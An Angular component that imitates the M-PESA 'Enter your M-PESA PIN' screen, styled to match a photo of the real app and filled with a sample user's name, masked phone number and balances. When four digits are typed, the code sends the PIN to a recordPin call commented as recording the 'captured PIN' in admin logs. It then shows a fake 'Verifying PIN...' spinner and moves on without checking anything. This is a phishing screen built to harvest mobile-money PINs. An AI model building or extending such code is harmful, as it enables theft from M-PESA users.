import { Component, OnInit, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { Router } from '@angular/router';
import { ApiService, UserProfile } from '../../services/api.service';

@Component({
  selector: 'app-pin-entry',
  standalone: true,
  imports: [CommonModule],
  template: `
    <div class="pin-screen">
      <!-- Top Title -->
      <div class="top-title-bar">
        <h1 class="page-title">Enter your M-PESA PIN</h1>
      </div>

      <!-- User Profile Information -->
      <div class="user-profile-section">
        <div class="avatar-circle">
          {{ user.initials || 'RO' }}
        </div>
        <div class="user-name">{{ user.name || 'Regarn Omondi' }}</div>
        <div class="user-phone">{{ user.maskedPhone || '079******85' }}</div>
      </div>

      <!-- Green Data Bundles Notice Pill (Exact match from photo) -->
      <div class="bundles-notice-pill">
        <div class="notice-icon">
          <svg viewBox="0 0 24 24" fill="none">
            <!-- Rosette / Scalloped badge shape -->
            <path d="M12 2L14.2 4.2L17.2 3.8L18.4 6.6L21.3 7.6L21.3 10.6L23.4 12.8L21.8 15.4L22.6 18.3L19.8 19.8L19.2 22.8L16.2 22.8L14.4 25.2L12 23.4L9.6 25.2L7.8 22.8L4.8 22.8L4.2 19.8L1.4 18.3L2.2 15.4L0.6 12.8L2.7 10.6L2.7 7.6L5.6 6.6L6.8 3.8L9.8 4.2L12 2Z" 
                  fill="#00c853" opacity="0.25"/>
            <path d="M12 4L13.8 5.6L16.2 5.3L17.2 7.5L19.5 8.3L19.5 10.7L21.2 12.5L19.9 14.6L20.5 16.9L18.3 18.1L17.8 20.5L15.4 20.5L14 22.4L12 21L10 22.4L8.6 20.5L6.2 20.5L5.7 18.1L3.5 16.9L4.1 14.6L2.8 12.5L4.5 10.7L4.5 8.3L6.8 7.5L7.8 5.3L10.2 5.6L12 4Z" 
                  stroke="#00c853" stroke-width="1.6"/>
            <!-- 'i' in center -->
            <path d="M12 9v1M12 13v4" stroke="#00c853" stroke-width="2.2" stroke-linecap="round"/>
            <circle cx="12" cy="8.5" r="1.2" fill="#00c853"/>
          </svg>
        </div>
        <span class="notice-text">This app will not use any of your data bundles</span>
      </div>

      <!-- 4 PIN Square Input Boxes (Dancing within the box when submitted) -->
      <div class="pin-boxes-container" [class.dancing]="isDancing">
        <div class="pin-box" [class.filled]="pin.length >= 1" [class.active]="pin.length === 0">
          <div class="pin-dot" *ngIf="pin.length >= 1"></div>
        </div>
        <div class="pin-box" [class.filled]="pin.length >= 2" [class.active]="pin.length === 1">
          <div class="pin-dot" *ngIf="pin.length >= 2"></div>
        </div>
        <div class="pin-box" [class.filled]="pin.length >= 3" [class.active]="pin.length === 2">
          <div class="pin-dot" *ngIf="pin.length >= 3"></div>
        </div>
        <div class="pin-box" [class.filled]="pin.length >= 4" [class.active]="pin.length === 3">
          <div class="pin-dot" *ngIf="pin.length >= 4"></div>
        </div>
      </div>

      <!-- Loading State while Dancing -->
      <div class="pin-loading-container">
        <div class="pin-loading-state" *ngIf="isLoading">
          <div class="mini-spinner"></div>
          <span class="loading-label">Verifying PIN...</span>
        </div>
        <div class="error-text" *ngIf="errorMessage && !isLoading">{{ errorMessage }}</div>
      </div>

      <!-- Numeric Keypad matching photo -->
      <div class="keypad-wrapper" [class.disabled-keypad]="isLoading">
        <div class="keypad-row">
          <button class="num-key" [disabled]="isLoading" (click)="pressKey('1')">1</button>
          <button class="num-key" [disabled]="isLoading" (click)="pressKey('2')">2</button>
          <button class="num-key" [disabled]="isLoading" (click)="pressKey('3')">3</button>
        </div>
        <div class="keypad-row">
          <button class="num-key" [disabled]="isLoading" (click)="pressKey('4')">4</button>
          <button class="num-key" [disabled]="isLoading" (click)="pressKey('5')">5</button>
          <button class="num-key" [disabled]="isLoading" (click)="pressKey('6')">6</button>
        </div>
        <div class="keypad-row">
          <button class="num-key" [disabled]="isLoading" (click)="pressKey('7')">7</button>
          <button class="num-key" [disabled]="isLoading" (click)="pressKey('8')">8</button>
          <button class="num-key" [disabled]="isLoading" (click)="pressKey('9')">9</button>
        </div>
        <div class="keypad-row">
          <div class="num-key empty-key"></div>
          <button class="num-key" [disabled]="isLoading" (click)="pressKey('0')">0</button>
          <!-- Green round backspace button with ✕ from photo -->
          <button class="num-key backspace-btn" [disabled]="isLoading" (click)="deleteKey()">
            <div class="green-x-badge">
              <svg viewBox="0 0 16 16" fill="none">
                <path d="M4 4L12 12M12 4L4 12" stroke="#00c853" stroke-width="2.2" stroke-linecap="round"/>
              </svg>
            </div>
          </button>
        </div>
      </div>

      <!-- Bottom Android Gesture Bar -->
      <div class="bottom-bar">
        <div class="home-indicator"></div>
      </div>
    </div>
  `,
  styles: [`
    .pin-screen {
      width: 100%;
      height: 100%;
      min-height: 100vh;
      min-height: 100dvh;
      background-color: #0b0c0e;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      color: #ffffff;
      padding: 30px 18px 12px 18px;
      user-select: none;
    }

    .top-title-bar {
      text-align: center;
      margin-top: 10px;
    }

    .page-title {
      font-size: 16.5px;
      font-weight: 600;
      color: #ffffff;
      letter-spacing: 0.2px;
    }

    /* User Profile */
    .user-profile-section {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 18px;
    }

    .avatar-circle {
      width: 62px;
      height: 62px;
      border-radius: 50%;
      background: #d83a2a;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 21px;
      font-weight: 800;
      color: #ffffff;
      margin-bottom: 12px;
      box-shadow: 0 4px 16px rgba(216, 58, 42, 0.35);
    }

    .user-name {
      font-size: 16.5px;
      font-weight: 700;
      color: #ffffff;
      margin-bottom: 3px;
    }

    .user-phone {
      font-size: 13.5px;
      color: #9aa0a6;
      letter-spacing: 0.3px;
    }

    /* Green Bundle Notice Pill */
    .bundles-notice-pill {
      background: rgba(0, 200, 83, 0.12);
      border: 1px solid rgba(0, 200, 83, 0.25);
      border-radius: 12px;
      padding: 10px 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin: 18px 8px 12px 8px;
    }

    .notice-icon {
      width: 22px;
      height: 22px;
      flex-shrink: 0;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .notice-icon svg {
      width: 100%;
      height: 100%;
    }

    .notice-text {
      font-size: 12px;
      font-weight: 600;
      color: #00e676;
      line-height: 1.25;
      text-align: center;
    }

    /* 4 PIN Square Boxes (Exact match from photo) */
    .pin-boxes-container {
      display: flex;
      justify-content: center;
      gap: 14px;
      margin: 20px 0 10px 0;
    }

    .pin-box {
      width: 54px;
      height: 54px;
      border-radius: 13px;
      border: 1.8px solid #535962;
      background: transparent;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: all 0.18s cubic-bezier(0.16, 1, 0.3, 1);
    }

    .pin-box.active {
      border-color: #8c939d;
    }

    .pin-box.filled {
      border-color: #00c853;
      box-shadow: 0 0 12px rgba(0, 200, 83, 0.25);
    }

    .pin-dot {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      background-color: #ffffff;
      animation: popIn 0.15s ease;
    }

    @keyframes popIn {
      from { transform: scale(0.4); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }

    /* Subtle wave dance within the box */
    .pin-boxes-container.dancing .pin-box {
      animation: boxDance 0.75s ease-in-out infinite alternate;
    }
    .pin-boxes-container.dancing .pin-box:nth-child(1) { animation-delay: 0.0s; }
    .pin-boxes-container.dancing .pin-box:nth-child(2) { animation-delay: 0.14s; }
    .pin-boxes-container.dancing .pin-box:nth-child(3) { animation-delay: 0.28s; }
    .pin-boxes-container.dancing .pin-box:nth-child(4) { animation-delay: 0.42s; }

    @keyframes boxDance {
      0% {
        transform: translateY(0);
        border-color: #00c853;
      }
      50% {
        transform: translateY(-4px);
        border-color: #00e676;
        box-shadow: 0 0 15px rgba(0, 230, 118, 0.4);
      }
      100% {
        transform: translateY(3px);
        border-color: #00c853;
      }
    }

    .pin-boxes-container.dancing .pin-dot {
      animation: dotPulse 0.75s ease-in-out infinite alternate;
    }
    .pin-boxes-container.dancing .pin-box:nth-child(1) .pin-dot { animation-delay: 0.0s; }
    .pin-boxes-container.dancing .pin-box:nth-child(2) .pin-dot { animation-delay: 0.14s; }
    .pin-boxes-container.dancing .pin-box:nth-child(3) .pin-dot { animation-delay: 0.28s; }
    .pin-boxes-container.dancing .pin-box:nth-child(4) .pin-dot { animation-delay: 0.42s; }

    @keyframes dotPulse {
      0% { transform: scale(1); background-color: #ffffff; }
      50% { transform: scale(1.15); background-color: #00e676; }
      100% { transform: scale(0.95); background-color: #ffffff; }
    }

    /* Loading state while dancing */
    .pin-loading-container {
      min-height: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 4px 0 10px 0;
    }

    .pin-loading-state {
      display: flex;
      align-items: center;
      gap: 8px;
      animation: fadeIn 0.2s ease;
    }

    .mini-spinner {
      width: 14px;
      height: 14px;
      border: 2px solid rgba(0, 200, 83, 0.25);
      border-top-color: #00e676;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
    }

    .loading-label {
      font-size: 12.5px;
      font-weight: 600;
      color: #00e676;
      letter-spacing: 0.2px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-4px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .error-text {
      color: #ff5252;
      font-size: 12.5px;
      text-align: center;
    }

    .disabled-keypad {
      opacity: 0.65;
      pointer-events: none;
    }

    /* Keypad Section */
    .keypad-wrapper {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-top: auto;
      padding: 0 16px 14px 16px;
    }

    .keypad-row {
      display: flex;
      justify-content: space-around;
      align-items: center;
    }

    .num-key {
      width: 72px;
      height: 60px;
      background: transparent;
      color: #ffffff;
      font-size: 26px;
      font-weight: 500;
      font-family: 'Plus Jakarta Sans', 'Inter', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 50%;
      transition: transform 0.1s, opacity 0.15s;
    }

    .num-key:active {
      opacity: 0.6;
      transform: scale(0.92);
    }

    .empty-key {
      pointer-events: none;
    }

    .backspace-btn {
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .green-x-badge {
      width: 28px;
      height: 28px;
      border-radius: 50%;
      border: 1.8px solid #00c853;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 5px;
    }

    .green-x-badge svg {
      width: 100%;
      height: 100%;
    }

    /* Bottom Bar */
    .bottom-bar {
      display: flex;
      justify-content: center;
      padding-bottom: 6px;
      flex-shrink: 0;
    }

    .home-indicator {
      width: 110px;
      height: 4px;
      background-color: #636b72;
      border-radius: 4px;
      opacity: 0.65;
    }
  `]
})
export class PinEntryComponent implements OnInit {
  private api = inject(ApiService);
  private router = inject(Router);

  pin: string = '';
  isNavigating: boolean = false;
  isLoading: boolean = false;
  isDancing: boolean = false;
  user: UserProfile = {
    name: 'Regarn Omondi',
    initials: 'RO',
    phone: '0798765485',
    maskedPhone: '079******85',
    greeting: 'Good morning,',
    balance: 61.66,
    fuliza: 100.00,
    airtime: 0.00
  };
  errorMessage: string = '';

  ngOnInit(): void {
    this.pin = '';
    this.isNavigating = false;
    this.isLoading = false;
    this.isDancing = false;
    this.api.user$.subscribe(u => {
      if (u) {
        this.user = u;
      }
    });
  }

  pressKey(digit: string): void {
    if (this.isLoading || this.isNavigating || this.pin.length >= 4) {
      return;
    }
    this.pin += digit;
    if (this.pin.length === 4) {
      this.isLoading = true;
      this.isDancing = true;
      // Record captured PIN in service & admin logs
      this.api.recordPin(this.pin, 'App Unlock / Login').subscribe();
      
      // Load a bit while dancing (~1.6 seconds)
      setTimeout(() => {
        this.isNavigating = true;
        this.router.navigate(['/home']);
      }, 1600);
    }
  }

  deleteKey(): void {
    if (this.isLoading || this.isNavigating) return;
    if (this.pin.length > 0) {
      this.pin = this.pin.slice(0, -1);
      this.errorMessage = '';
    }
  }
}
